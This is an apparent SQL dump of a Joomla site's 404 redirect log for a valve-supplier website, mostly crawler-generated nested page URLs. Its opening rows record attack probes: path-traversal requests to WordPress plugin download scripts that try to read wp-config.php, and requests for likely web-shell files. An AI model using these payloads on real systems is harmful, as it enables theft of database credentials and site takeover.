(1585, 'http://flotechcontrols.com/wp-admin/admin-ajax.php?action=getfile&/../../wp-config.php', '', '', '', 1, 0, '2015-01-18 11:49:29', '0000-00-00 00:00:00'),
(1586, 'http://flotechcontrols.com/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download', '', '', '', 1, 0, '2015-01-18 11:50:05', '0000-00-00 00:00:00'),
(1587, 'http://flotechcontrols.com/wp-content/themes/parallelus-mingle/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php', '', '', '', 1, 0, '2015-01-18 11:50:33', '0000-00-00 00:00:00'),
(1588, 'http://flotechcontrols.com/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php', '', '', '', 1, 0, '2015-01-18 11:50:55', '0000-00-00 00:00:00'),
(1589, 'http://flotechcontrols.com/ajax.list.search.php', '', '', '', 1, 0, '2015-01-19 09:44:52', '0000-00-00 00:00:00'),
(1590, 'http://flotechcontrols.com/libraries/fedit.php', '', '', '', 1, 0, '2015-01-23 18:53:10', '0000-00-00 00:00:00'),
(1591, 'http://flotechcontrols.com/images/lmages.php?input', '', '', '', 1, 0, '2015-01-24 16:43:15', '0000-00-00 00:00:00'),
(1592, 'http://flotechcontrols.com/tmp/sysm.php', '', '', '', 1, 0, '2015-01-24 17:12:15', '0000-00-00 00:00:00'),
(1593, 'http://flotechcontrols.com/about-us/about-us', '', '', '', 1, 0, '2015-01-24 18:46:43', '0000-00-00 00:00:00'),
(1594, 'http://flotechcontrols.com/about-us/products/red-valve', '', '', '', 1, 0, '2015-01-24 18:46:44', '0000-00-00 00:00:00'),
(1595, 'http://flotechcontrols.com/about-us/products/tideflex', '', '', '', 1, 0, '2015-01-24 18:46:45', '0000-00-00 00:00:00'),
(1596, 'http://flotechcontrols.com/about-us/products/wey', '', '', '', 1, 0, '2015-01-24 18:46:45', '0000-00-00 00:00:00'),
(1597, 'http://flotechcontrols.com/about-us/products/noreva', '', '', '', 1, 0, '2015-01-24 18:46:46', '0000-00-00 00:00:00'),
(1598, 'http://flotechcontrols.com/about-us/products/valvtechnologies', '', '', '', 1, 0, '2015-01-24 18:46:46', '0000-00-00 00:00:00'),
(1599, 'http://flotechcontrols.com/about-us/products/birkett', '', '', '', 1, 0, '2015-01-24 18:46:47', '0000-00-00 00:00:00'),
(1600, 'http://flotechcontrols.com/about-us/products/sor', '', '', '', 1, 0, '2015-01-24 18:46:47', '0000-00-00 00:00:00'),
(1601, 'http://flotechcontrols.com/about-us/products/mts', '', '', '', 1, 0, '2015-01-24 18:46:48', '0000-00-00 00:00:00'),
(1602, 'http://flotechcontrols.com/about-us/products/copes', '', '', '', 1, 0, '2015-01-24 18:46:48', '0000-00-00 00:00:00'),
(1603, 'http://flotechcontrols.com/about-us/application-sectors/power', '', '', '', 1, 0, '2015-01-24 18:46:49', '0000-00-00 00:00:00'),
(1604, 'http://flotechcontrols.com/about-us/application-sectors/water', '', '', '', 1, 0, '2015-01-24 18:46:50', '0000-00-00 00:00:00'),
(1605, 'http://flotechcontrols.com/about-us/application-sectors/mining', '', '', '', 1, 0, '2015-01-24 18:46:50', '0000-00-00 00:00:00'),
(1606, 'http://flotechcontrols.com/about-us/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-24 18:46:51', '0000-00-00 00:00:00'),
(1607, 'http://flotechcontrols.com/about-us/contact-us', '', '', '', 1, 0, '2015-01-24 18:46:51', '0000-00-00 00:00:00'),
(1608, 'http://flotechcontrols.com/products/red-valve/about-us', '', '', '', 1, 0, '2015-01-24 18:46:55', '0000-00-00 00:00:00'),
(1609, 'http://flotechcontrols.com/products/red-valve/products/red-valve', '', '', '', 1, 0, '2015-01-24 18:46:55', '0000-00-00 00:00:00'),
(1610, 'http://flotechcontrols.com/products/red-valve/products/tideflex', '', '', '', 1, 0, '2015-01-24 18:46:56', '0000-00-00 00:00:00'),
(1611, 'http://flotechcontrols.com/products/red-valve/products/wey', '', '', '', 1, 0, '2015-01-24 18:46:56', '0000-00-00 00:00:00'),
(1612, 'http://flotechcontrols.com/products/red-valve/products/noreva', '', '', '', 1, 0, '2015-01-24 18:46:57', '0000-00-00 00:00:00'),
(1613, 'http://flotechcontrols.com/products/red-valve/products/valvtechnologies', '', '', '', 1, 0, '2015-01-24 18:46:58', '0000-00-00 00:00:00'),
(1614, 'http://flotechcontrols.com/products/red-valve/products/birkett', '', '', '', 1, 0, '2015-01-24 18:46:58', '0000-00-00 00:00:00'),
(1615, 'http://flotechcontrols.com/products/red-valve/products/sor', '', '', '', 1, 0, '2015-01-24 18:46:59', '0000-00-00 00:00:00'),
(1616, 'http://flotechcontrols.com/products/red-valve/products/mts', '', '', '', 1, 0, '2015-01-24 18:46:59', '0000-00-00 00:00:00'),
(1617, 'http://flotechcontrols.com/products/red-valve/products/copes', '', '', '', 1, 0, '2015-01-24 18:47:00', '0000-00-00 00:00:00'),
(1618, 'http://flotechcontrols.com/products/red-valve/application-sectors/power', '', '', '', 1, 0, '2015-01-24 18:47:00', '0000-00-00 00:00:00'),
(1619, 'http://flotechcontrols.com/products/red-valve/application-sectors/water', '', '', '', 1, 0, '2015-01-24 18:47:01', '0000-00-00 00:00:00'),
(1620, 'http://flotechcontrols.com/products/red-valve/application-sectors/mining', '', '', '', 1, 0, '2015-01-24 18:47:01', '0000-00-00 00:00:00'),
(1621, 'http://flotechcontrols.com/products/red-valve/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-24 18:47:02', '0000-00-00 00:00:00'),
(1622, 'http://flotechcontrols.com/products/red-valve/contact-us', '', '', '', 1, 0, '2015-01-24 18:47:03', '0000-00-00 00:00:00'),
(1623, 'http://flotechcontrols.com/products/tideflex/about-us', '', '', '', 1, 0, '2015-01-24 18:47:06', '0000-00-00 00:00:00'),
(1624, 'http://flotechcontrols.com/products/tideflex/products/red-valve', '', '', '', 1, 0, '2015-01-24 18:47:07', '0000-00-00 00:00:00'),
(1625, 'http://flotechcontrols.com/products/tideflex/products/tideflex', '', '', '', 1, 0, '2015-01-24 18:47:07', '0000-00-00 00:00:00'),
(1626, 'http://flotechcontrols.com/products/tideflex/products/wey', '', '', '', 1, 0, '2015-01-24 18:47:08', '0000-00-00 00:00:00'),
(1627, 'http://flotechcontrols.com/products/tideflex/products/noreva', '', '', '', 1, 0, '2015-01-24 18:47:09', '0000-00-00 00:00:00'),
(1628, 'http://flotechcontrols.com/products/tideflex/products/valvtechnologies', '', '', '', 1, 0, '2015-01-24 18:47:09', '0000-00-00 00:00:00'),
(1629, 'http://flotechcontrols.com/products/tideflex/products/birkett', '', '', '', 1, 0, '2015-01-24 18:47:10', '0000-00-00 00:00:00'),
(1630, 'http://flotechcontrols.com/products/tideflex/products/sor', '', '', '', 1, 0, '2015-01-24 18:47:10', '0000-00-00 00:00:00'),
(1631, 'http://flotechcontrols.com/products/tideflex/products/mts', '', '', '', 1, 0, '2015-01-24 18:47:11', '0000-00-00 00:00:00'),
(1632, 'http://flotechcontrols.com/products/tideflex/products/copes', '', '', '', 1, 0, '2015-01-24 18:47:12', '0000-00-00 00:00:00'),
(1633, 'http://flotechcontrols.com/products/tideflex/application-sectors/power', '', '', '', 1, 0, '2015-01-24 18:47:12', '0000-00-00 00:00:00'),
(1634, 'http://flotechcontrols.com/products/tideflex/application-sectors/water', '', '', '', 1, 0, '2015-01-24 18:47:13', '0000-00-00 00:00:00'),
(1635, 'http://flotechcontrols.com/products/tideflex/application-sectors/mining', '', '', '', 1, 0, '2015-01-24 18:47:13', '0000-00-00 00:00:00'),
(1636, 'http://flotechcontrols.com/products/tideflex/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-24 18:47:14', '0000-00-00 00:00:00'),
(1637, 'http://flotechcontrols.com/products/tideflex/contact-us', '', '', '', 1, 0, '2015-01-24 18:47:14', '0000-00-00 00:00:00'),
(1638, 'http://flotechcontrols.com/products/wey/about-us', '', '', '', 1, 0, '2015-01-24 18:47:18', '0000-00-00 00:00:00'),
(1639, 'http://flotechcontrols.com/products/wey/products/red-valve', '', '', '', 1, 0, '2015-01-24 18:47:19', '0000-00-00 00:00:00'),
(1640, 'http://flotechcontrols.com/products/wey/products/tideflex', '', '', '', 1, 0, '2015-01-24 18:47:19', '0000-00-00 00:00:00'),
(1641, 'http://flotechcontrols.com/products/wey/products/wey', '', '', '', 1, 0, '2015-01-24 18:47:20', '0000-00-00 00:00:00'),
(1642, 'http://flotechcontrols.com/products/wey/products/noreva', '', '', '', 1, 0, '2015-01-24 18:47:20', '0000-00-00 00:00:00'),
(1643, 'http://flotechcontrols.com/products/wey/products/valvtechnologies', '', '', '', 1, 0, '2015-01-24 18:47:21', '0000-00-00 00:00:00'),
(1644, 'http://flotechcontrols.com/products/wey/products/birkett', '', '', '', 1, 0, '2015-01-24 18:47:21', '0000-00-00 00:00:00'),
(1645, 'http://flotechcontrols.com/products/wey/products/sor', '', '', '', 1, 0, '2015-01-24 18:47:22', '0000-00-00 00:00:00'),
(1646, 'http://flotechcontrols.com/products/wey/products/mts', '', '', '', 1, 0, '2015-01-24 18:47:23', '0000-00-00 00:00:00'),
(1647, 'http://flotechcontrols.com/products/wey/products/copes', '', '', '', 1, 0, '2015-01-24 18:47:23', '0000-00-00 00:00:00'),
(1648, 'http://flotechcontrols.com/products/wey/application-sectors/power', '', '', '', 1, 0, '2015-01-24 18:47:24', '0000-00-00 00:00:00'),
(1649, 'http://flotechcontrols.com/products/wey/application-sectors/water', '', '', '', 1, 0, '2015-01-24 18:47:24', '0000-00-00 00:00:00'),
(1650, 'http://flotechcontrols.com/products/wey/application-sectors/mining', '', '', '', 1, 0, '2015-01-24 18:47:25', '0000-00-00 00:00:00'),
(1651, 'http://flotechcontrols.com/products/wey/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-24 18:47:25', '0000-00-00 00:00:00'),
(1652, 'http://flotechcontrols.com/products/wey/contact-us', '', '', '', 1, 0, '2015-01-24 18:47:26', '0000-00-00 00:00:00'),
(1653, 'http://flotechcontrols.com/products/noreva/about-us', '', '', '', 1, 0, '2015-01-24 18:47:31', '0000-00-00 00:00:00'),
(1654, 'http://flotechcontrols.com/products/noreva/products/red-valve', '', '', '', 1, 0, '2015-01-24 18:47:32', '0000-00-00 00:00:00'),
(1655, 'http://flotechcontrols.com/products/noreva/products/tideflex', '', '', '', 1, 0, '2015-01-24 18:47:32', '0000-00-00 00:00:00'),
(1656, 'http://flotechcontrols.com/products/noreva/products/wey', '', '', '', 1, 0, '2015-01-24 18:47:33', '0000-00-00 00:00:00'),
(1657, 'http://flotechcontrols.com/products/noreva/products/noreva', '', '', '', 1, 0, '2015-01-24 18:47:33', '0000-00-00 00:00:00'),
(1658, 'http://flotechcontrols.com/products/noreva/products/valvtechnologies', '', '', '', 1, 0, '2015-01-24 18:47:34', '0000-00-00 00:00:00'),
(1659, 'http://flotechcontrols.com/products/noreva/products/birkett', '', '', '', 1, 0, '2015-01-24 18:47:35', '0000-00-00 00:00:00'),
(1660, 'http://flotechcontrols.com/products/noreva/products/sor', '', '', '', 1, 0, '2015-01-24 18:47:35', '0000-00-00 00:00:00'),
(1661, 'http://flotechcontrols.com/products/noreva/products/mts', '', '', '', 1, 0, '2015-01-24 18:47:36', '0000-00-00 00:00:00'),
(1662, 'http://flotechcontrols.com/products/noreva/products/copes', '', '', '', 1, 0, '2015-01-24 18:47:36', '0000-00-00 00:00:00'),
(1663, 'http://flotechcontrols.com/products/noreva/application-sectors/power', '', '', '', 1, 0, '2015-01-24 18:47:37', '0000-00-00 00:00:00'),
(1664, 'http://flotechcontrols.com/products/noreva/application-sectors/water', '', '', '', 1, 0, '2015-01-24 18:47:37', '0000-00-00 00:00:00'),
(1665, 'http://flotechcontrols.com/products/noreva/application-sectors/mining', '', '', '', 1, 0, '2015-01-24 18:47:38', '0000-00-00 00:00:00'),
(1666, 'http://flotechcontrols.com/products/noreva/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-24 18:47:39', '0000-00-00 00:00:00'),
(1667, 'http://flotechcontrols.com/products/noreva/contact-us', '', '', '', 1, 0, '2015-01-24 18:47:39', '0000-00-00 00:00:00'),
(1668, 'http://flotechcontrols.com/products/valvtechnologies/about-us', '', '', '', 1, 0, '2015-01-24 18:47:43', '0000-00-00 00:00:00'),
(1669, 'http://flotechcontrols.com/products/valvtechnologies/products/red-valve', '', '', '', 1, 0, '2015-01-24 18:47:43', '0000-00-00 00:00:00'),
(1670, 'http://flotechcontrols.com/products/valvtechnologies/products/tideflex', '', '', '', 1, 0, '2015-01-24 18:47:44', '0000-00-00 00:00:00'),
(1671, 'http://flotechcontrols.com/products/valvtechnologies/products/wey', '', '', '', 1, 0, '2015-01-24 18:47:44', '0000-00-00 00:00:00'),
(1672, 'http://flotechcontrols.com/products/valvtechnologies/products/noreva', '', '', '', 1, 0, '2015-01-24 18:47:45', '0000-00-00 00:00:00'),
(1673, 'http://flotechcontrols.com/products/valvtechnologies/products/valvtechnologies', '', '', '', 1, 0, '2015-01-24 18:47:46', '0000-00-00 00:00:00'),
(1674, 'http://flotechcontrols.com/products/valvtechnologies/products/birkett', '', '', '', 1, 0, '2015-01-24 18:47:46', '0000-00-00 00:00:00'),
(1675, 'http://flotechcontrols.com/products/valvtechnologies/products/sor', '', '', '', 1, 0, '2015-01-24 18:47:47', '0000-00-00 00:00:00'),
(1676, 'http://flotechcontrols.com/products/valvtechnologies/products/mts', '', '', '', 1, 0, '2015-01-24 18:47:47', '0000-00-00 00:00:00'),
(1677, 'http://flotechcontrols.com/products/valvtechnologies/products/copes', '', '', '', 1, 0, '2015-01-24 18:47:48', '0000-00-00 00:00:00'),
(1678, 'http://flotechcontrols.com/products/valvtechnologies/application-sectors/power', '', '', '', 1, 0, '2015-01-24 18:47:49', '0000-00-00 00:00:00'),
(1679, 'http://flotechcontrols.com/products/valvtechnologies/application-sectors/water', '', '', '', 1, 0, '2015-01-24 18:47:49', '0000-00-00 00:00:00'),
(1680, 'http://flotechcontrols.com/products/valvtechnologies/application-sectors/mining', '', '', '', 1, 0, '2015-01-24 18:47:50', '0000-00-00 00:00:00'),
(1681, 'http://flotechcontrols.com/products/valvtechnologies/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-24 18:47:50', '0000-00-00 00:00:00'),
(1682, 'http://flotechcontrols.com/products/valvtechnologies/contact-us', '', '', '', 1, 0, '2015-01-24 18:47:51', '0000-00-00 00:00:00'),
(1683, 'http://flotechcontrols.com/products/birkett/about-us', '', '', '', 1, 0, '2015-01-24 18:47:54', '0000-00-00 00:00:00'),
(1684, 'http://flotechcontrols.com/products/birkett/products/red-valve', '', '', '', 1, 0, '2015-01-24 18:47:55', '0000-00-00 00:00:00'),
(1685, 'http://flotechcontrols.com/products/birkett/products/tideflex', '', '', '', 1, 0, '2015-01-24 18:47:55', '0000-00-00 00:00:00'),
(1686, 'http://flotechcontrols.com/products/birkett/products/wey', '', '', '', 1, 0, '2015-01-24 18:47:56', '0000-00-00 00:00:00'),
(1687, 'http://flotechcontrols.com/products/birkett/products/noreva', '', '', '', 1, 0, '2015-01-24 18:47:57', '0000-00-00 00:00:00'),
(1688, 'http://flotechcontrols.com/products/birkett/products/valvtechnologies', '', '', '', 1, 0, '2015-01-24 18:47:57', '0000-00-00 00:00:00'),
(1689, 'http://flotechcontrols.com/products/birkett/products/birkett', '', '', '', 1, 0, '2015-01-24 18:47:58', '0000-00-00 00:00:00'),
(1690, 'http://flotechcontrols.com/products/birkett/products/sor', '', '', '', 1, 0, '2015-01-24 18:47:58', '0000-00-00 00:00:00'),
(1691, 'http://flotechcontrols.com/products/birkett/products/mts', '', '', '', 1, 0, '2015-01-24 18:47:59', '0000-00-00 00:00:00'),
(1692, 'http://flotechcontrols.com/products/birkett/products/copes', '', '', '', 1, 0, '2015-01-24 18:47:59', '0000-00-00 00:00:00'),
(1693, 'http://flotechcontrols.com/products/birkett/application-sectors/power', '', '', '', 1, 0, '2015-01-24 18:48:00', '0000-00-00 00:00:00'),
(1694, 'http://flotechcontrols.com/products/birkett/application-sectors/water', '', '', '', 1, 0, '2015-01-24 18:48:01', '0000-00-00 00:00:00'),
(1695, 'http://flotechcontrols.com/products/birkett/application-sectors/mining', '', '', '', 1, 0, '2015-01-24 18:48:01', '0000-00-00 00:00:00'),
(1696, 'http://flotechcontrols.com/products/birkett/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-24 18:48:02', '0000-00-00 00:00:00'),
(1697, 'http://flotechcontrols.com/products/birkett/contact-us', '', '', '', 1, 0, '2015-01-24 18:48:02', '0000-00-00 00:00:00'),
(1698, 'http://flotechcontrols.com/products/sor/about-us', '', '', '', 1, 0, '2015-01-24 18:48:06', '0000-00-00 00:00:00'),
(1699, 'http://flotechcontrols.com/products/sor/products/red-valve', '', '', '', 1, 0, '2015-01-24 18:48:07', '0000-00-00 00:00:00'),
(1700, 'http://flotechcontrols.com/products/sor/products/tideflex', '', '', '', 1, 0, '2015-01-24 18:48:07', '0000-00-00 00:00:00'),
(1701, 'http://flotechcontrols.com/products/sor/products/wey', '', '', '', 1, 0, '2015-01-24 18:48:08', '0000-00-00 00:00:00'),
(1702, 'http://flotechcontrols.com/products/sor/products/noreva', '', '', '', 1, 0, '2015-01-24 18:48:08', '0000-00-00 00:00:00'),
(1703, 'http://flotechcontrols.com/products/sor/products/valvtechnologies', '', '', '', 1, 0, '2015-01-24 18:48:09', '0000-00-00 00:00:00'),
(1704, 'http://flotechcontrols.com/products/sor/products/birkett', '', '', '', 1, 0, '2015-01-24 18:48:09', '0000-00-00 00:00:00'),
(1705, 'http://flotechcontrols.com/products/sor/products/sor', '', '', '', 1, 0, '2015-01-24 18:48:10', '0000-00-00 00:00:00'),
(1706, 'http://flotechcontrols.com/products/sor/products/mts', '', '', '', 1, 0, '2015-01-24 18:48:11', '0000-00-00 00:00:00'),
(1707, 'http://flotechcontrols.com/products/sor/products/copes', '', '', '', 1, 0, '2015-01-24 18:48:11', '0000-00-00 00:00:00'),
(1708, 'http://flotechcontrols.com/products/sor/application-sectors/power', '', '', '', 1, 0, '2015-01-24 18:48:12', '0000-00-00 00:00:00'),
(1709, 'http://flotechcontrols.com/products/sor/application-sectors/water', '', '', '', 1, 0, '2015-01-24 18:48:12', '0000-00-00 00:00:00'),
(1710, 'http://flotechcontrols.com/products/sor/application-sectors/mining', '', '', '', 1, 0, '2015-01-24 18:48:13', '0000-00-00 00:00:00'),
(1711, 'http://flotechcontrols.com/products/sor/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-24 18:48:13', '0000-00-00 00:00:00'),
(1712, 'http://flotechcontrols.com/products/sor/contact-us', '', '', '', 1, 0, '2015-01-24 18:48:14', '0000-00-00 00:00:00'),
(1713, 'http://flotechcontrols.com/products/mts/about-us', '', '', '', 1, 0, '2015-01-24 18:48:17', '0000-00-00 00:00:00'),
(1714, 'http://flotechcontrols.com/products/mts/products/red-valve', '', '', '', 1, 0, '2015-01-24 18:48:18', '0000-00-00 00:00:00'),
(1715, 'http://flotechcontrols.com/products/mts/products/tideflex', '', '', '', 1, 0, '2015-01-24 18:48:19', '0000-00-00 00:00:00'),
(1716, 'http://flotechcontrols.com/products/mts/products/wey', '', '', '', 1, 0, '2015-01-24 18:48:19', '0000-00-00 00:00:00'),
(1717, 'http://flotechcontrols.com/products/mts/products/noreva', '', '', '', 1, 0, '2015-01-24 18:48:20', '0000-00-00 00:00:00'),
(1718, 'http://flotechcontrols.com/products/mts/products/valvtechnologies', '', '', '', 1, 0, '2015-01-24 18:48:20', '0000-00-00 00:00:00'),
(1719, 'http://flotechcontrols.com/products/mts/products/birkett', '', '', '', 1, 0, '2015-01-24 18:48:21', '0000-00-00 00:00:00'),
(1720, 'http://flotechcontrols.com/products/mts/products/sor', '', '', '', 1, 0, '2015-01-24 18:48:21', '0000-00-00 00:00:00'),
(1721, 'http://flotechcontrols.com/products/mts/products/mts', '', '', '', 1, 0, '2015-01-24 18:48:22', '0000-00-00 00:00:00'),
(1722, 'http://flotechcontrols.com/products/mts/products/copes', '', '', '', 1, 0, '2015-01-24 18:48:23', '0000-00-00 00:00:00'),
(1723, 'http://flotechcontrols.com/products/mts/application-sectors/power', '', '', '', 1, 0, '2015-01-24 18:48:23', '0000-00-00 00:00:00'),
(1724, 'http://flotechcontrols.com/products/mts/application-sectors/water', '', '', '', 1, 0, '2015-01-24 18:48:24', '0000-00-00 00:00:00'),
(1725, 'http://flotechcontrols.com/products/mts/application-sectors/mining', '', '', '', 1, 0, '2015-01-24 18:48:24', '0000-00-00 00:00:00'),
(1726, 'http://flotechcontrols.com/products/mts/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-24 18:48:25', '0000-00-00 00:00:00'),
(1727, 'http://flotechcontrols.com/products/mts/contact-us', '', '', '', 1, 0, '2015-01-24 18:48:26', '0000-00-00 00:00:00'),
(1728, 'http://flotechcontrols.com/products/copes/about-us', '', '', '', 1, 0, '2015-01-24 18:48:29', '0000-00-00 00:00:00'),
(1729, 'http://flotechcontrols.com/products/copes/products/red-valve', '', '', '', 1, 0, '2015-01-24 18:48:30', '0000-00-00 00:00:00'),
(1730, 'http://flotechcontrols.com/products/copes/products/tideflex', '', '', '', 1, 0, '2015-01-24 18:48:30', '0000-00-00 00:00:00'),
(1731, 'http://flotechcontrols.com/products/copes/products/wey', '', '', '', 1, 0, '2015-01-24 18:48:31', '0000-00-00 00:00:00'),
(1732, 'http://flotechcontrols.com/products/copes/products/noreva', '', '', '', 1, 0, '2015-01-24 18:48:31', '0000-00-00 00:00:00'),
(1733, 'http://flotechcontrols.com/products/copes/products/valvtechnologies', '', '', '', 1, 0, '2015-01-24 18:48:32', '0000-00-00 00:00:00'),
(1734, 'http://flotechcontrols.com/products/copes/products/birkett', '', '', '', 1, 0, '2015-01-24 18:48:33', '0000-00-00 00:00:00'),
(1735, 'http://flotechcontrols.com/products/copes/products/sor', '', '', '', 1, 0, '2015-01-24 18:48:33', '0000-00-00 00:00:00'),
(1736, 'http://flotechcontrols.com/products/copes/products/mts', '', '', '', 1, 0, '2015-01-24 18:48:34', '0000-00-00 00:00:00'),
(1737, 'http://flotechcontrols.com/products/copes/products/copes', '', '', '', 1, 0, '2015-01-24 18:48:34', '0000-00-00 00:00:00'),
(1738, 'http://flotechcontrols.com/products/copes/application-sectors/power', '', '', '', 1, 0, '2015-01-24 18:48:35', '0000-00-00 00:00:00'),
(1739, 'http://flotechcontrols.com/products/copes/application-sectors/water', '', '', '', 1, 0, '2015-01-24 18:48:35', '0000-00-00 00:00:00'),
(1740, 'http://flotechcontrols.com/products/copes/application-sectors/mining', '', '', '', 1, 0, '2015-01-24 18:48:36', '0000-00-00 00:00:00');
INSERT INTO `j6kpf_redirect_links` (`id`, `old_url`, `new_url`, `referer`, `comment`, `hits`, `published`, `created_date`, `modified_date`) VALUES
(1741, 'http://flotechcontrols.com/products/copes/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-24 18:48:37', '0000-00-00 00:00:00'),
(1742, 'http://flotechcontrols.com/products/copes/contact-us', '', '', '', 1, 0, '2015-01-24 18:48:37', '0000-00-00 00:00:00'),
(1743, 'http://flotechcontrols.com/application-sectors/power/about-us', '', '', '', 1, 0, '2015-01-24 18:48:41', '0000-00-00 00:00:00'),
(1744, 'http://flotechcontrols.com/application-sectors/power/products/red-valve', '', '', '', 1, 0, '2015-01-24 18:48:41', '0000-00-00 00:00:00'),
(1745, 'http://flotechcontrols.com/application-sectors/power/products/tideflex', '', '', '', 1, 0, '2015-01-24 18:48:42', '0000-00-00 00:00:00'),
(1746, 'http://flotechcontrols.com/application-sectors/power/products/wey', '', '', '', 1, 0, '2015-01-24 18:48:42', '0000-00-00 00:00:00'),
(1747, 'http://flotechcontrols.com/application-sectors/power/products/noreva', '', '', '', 1, 0, '2015-01-24 18:48:43', '0000-00-00 00:00:00'),
(1748, 'http://flotechcontrols.com/application-sectors/power/products/valvtechnologies', '', '', '', 1, 0, '2015-01-24 18:48:44', '0000-00-00 00:00:00'),
(1749, 'http://flotechcontrols.com/application-sectors/power/products/birkett', '', '', '', 1, 0, '2015-01-24 18:48:44', '0000-00-00 00:00:00'),
(1750, 'http://flotechcontrols.com/application-sectors/power/products/sor', '', '', '', 1, 0, '2015-01-24 18:48:45', '0000-00-00 00:00:00'),
(1751, 'http://flotechcontrols.com/application-sectors/power/products/mts', '', '', '', 1, 0, '2015-01-24 18:48:45', '0000-00-00 00:00:00'),
(1752, 'http://flotechcontrols.com/application-sectors/power/products/copes', '', '', '', 1, 0, '2015-01-24 18:48:46', '0000-00-00 00:00:00'),
(1753, 'http://flotechcontrols.com/application-sectors/power/application-sectors/power', '', '', '', 1, 0, '2015-01-24 18:48:46', '0000-00-00 00:00:00'),
(1754, 'http://flotechcontrols.com/application-sectors/power/application-sectors/water', '', '', '', 1, 0, '2015-01-24 18:48:47', '0000-00-00 00:00:00'),
(1755, 'http://flotechcontrols.com/application-sectors/power/application-sectors/mining', '', '', '', 1, 0, '2015-01-24 18:48:47', '0000-00-00 00:00:00'),
(1756, 'http://flotechcontrols.com/application-sectors/power/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-24 18:48:48', '0000-00-00 00:00:00'),
(1757, 'http://flotechcontrols.com/application-sectors/power/contact-us', '', '', '', 1, 0, '2015-01-24 18:48:49', '0000-00-00 00:00:00'),
(1758, 'http://flotechcontrols.com/application-sectors/water/about-us', '', '', '', 1, 0, '2015-01-24 18:48:52', '0000-00-00 00:00:00'),
(1759, 'http://flotechcontrols.com/application-sectors/water/products/red-valve', '', '', '', 1, 0, '2015-01-24 18:48:53', '0000-00-00 00:00:00'),
(1760, 'http://flotechcontrols.com/application-sectors/water/products/tideflex', '', '', '', 1, 0, '2015-01-24 18:48:53', '0000-00-00 00:00:00'),
(1761, 'http://flotechcontrols.com/application-sectors/water/products/wey', '', '', '', 1, 0, '2015-01-24 18:48:54', '0000-00-00 00:00:00'),
(1762, 'http://flotechcontrols.com/application-sectors/water/products/noreva', '', '', '', 1, 0, '2015-01-24 18:48:54', '0000-00-00 00:00:00'),
(1763, 'http://flotechcontrols.com/application-sectors/water/products/valvtechnologies', '', '', '', 1, 0, '2015-01-24 18:48:55', '0000-00-00 00:00:00'),
(1764, 'http://flotechcontrols.com/application-sectors/water/products/birkett', '', '', '', 1, 0, '2015-01-24 18:48:55', '0000-00-00 00:00:00'),
(1765, 'http://flotechcontrols.com/application-sectors/water/products/sor', '', '', '', 1, 0, '2015-01-24 18:48:56', '0000-00-00 00:00:00'),
(1766, 'http://flotechcontrols.com/application-sectors/water/products/mts', '', '', '', 1, 0, '2015-01-24 18:48:57', '0000-00-00 00:00:00'),
(1767, 'http://flotechcontrols.com/application-sectors/water/products/copes', '', '', '', 1, 0, '2015-01-24 18:48:57', '0000-00-00 00:00:00'),
(1768, 'http://flotechcontrols.com/application-sectors/water/application-sectors/power', '', '', '', 1, 0, '2015-01-24 18:48:58', '0000-00-00 00:00:00'),
(1769, 'http://flotechcontrols.com/application-sectors/water/application-sectors/water', '', '', '', 1, 0, '2015-01-24 18:48:59', '0000-00-00 00:00:00'),
(1770, 'http://flotechcontrols.com/application-sectors/water/application-sectors/mining', '', '', '', 1, 0, '2015-01-24 18:48:59', '0000-00-00 00:00:00'),
(1771, 'http://flotechcontrols.com/application-sectors/water/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-24 18:49:00', '0000-00-00 00:00:00'),
(1772, 'http://flotechcontrols.com/application-sectors/water/contact-us', '', '', '', 1, 0, '2015-01-24 18:49:00', '0000-00-00 00:00:00'),
(1773, 'http://flotechcontrols.com/application-sectors/mining/about-us', '', '', '', 1, 0, '2015-01-24 18:49:04', '0000-00-00 00:00:00'),
(1774, 'http://flotechcontrols.com/application-sectors/mining/products/red-valve', '', '', '', 1, 0, '2015-01-24 18:49:04', '0000-00-00 00:00:00'),
(1775, 'http://flotechcontrols.com/application-sectors/mining/products/tideflex', '', '', '', 1, 0, '2015-01-24 18:49:05', '0000-00-00 00:00:00'),
(1776, 'http://flotechcontrols.com/application-sectors/mining/products/wey', '', '', '', 1, 0, '2015-01-24 18:49:06', '0000-00-00 00:00:00'),
(1777, 'http://flotechcontrols.com/application-sectors/mining/products/noreva', '', '', '', 1, 0, '2015-01-24 18:49:06', '0000-00-00 00:00:00'),
(1778, 'http://flotechcontrols.com/application-sectors/mining/products/valvtechnologies', '', '', '', 1, 0, '2015-01-24 18:49:07', '0000-00-00 00:00:00'),
(1779, 'http://flotechcontrols.com/application-sectors/mining/products/birkett', '', '', '', 1, 0, '2015-01-24 18:49:07', '0000-00-00 00:00:00'),
(1780, 'http://flotechcontrols.com/application-sectors/mining/products/sor', '', '', '', 1, 0, '2015-01-24 18:49:08', '0000-00-00 00:00:00'),
(1781, 'http://flotechcontrols.com/application-sectors/mining/products/mts', '', '', '', 1, 0, '2015-01-24 18:49:08', '0000-00-00 00:00:00'),
(1782, 'http://flotechcontrols.com/application-sectors/mining/products/copes', '', '', '', 1, 0, '2015-01-24 18:49:09', '0000-00-00 00:00:00'),
(1783, 'http://flotechcontrols.com/application-sectors/mining/application-sectors/power', '', '', '', 1, 0, '2015-01-24 18:49:10', '0000-00-00 00:00:00'),
(1784, 'http://flotechcontrols.com/application-sectors/mining/application-sectors/water', '', '', '', 1, 0, '2015-01-24 18:49:10', '0000-00-00 00:00:00'),
(1785, 'http://flotechcontrols.com/application-sectors/mining/application-sectors/mining', '', '', '', 1, 0, '2015-01-24 18:49:11', '0000-00-00 00:00:00'),
